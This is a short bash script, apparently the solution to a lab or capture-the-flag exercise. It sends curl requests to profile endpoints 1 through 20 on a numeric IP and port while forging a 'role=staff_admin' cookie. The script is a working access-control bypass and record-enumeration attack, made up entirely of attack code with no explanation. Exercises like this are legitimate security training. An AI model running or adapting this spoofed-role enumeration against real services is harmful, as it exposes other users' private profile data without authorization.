#!/bin/bash

for i in {1..20}; do
  curl -b 'role=staff_admin' http://94.237.54.214:33145/profile/api.php/profile/$i
  printf "\n"
done
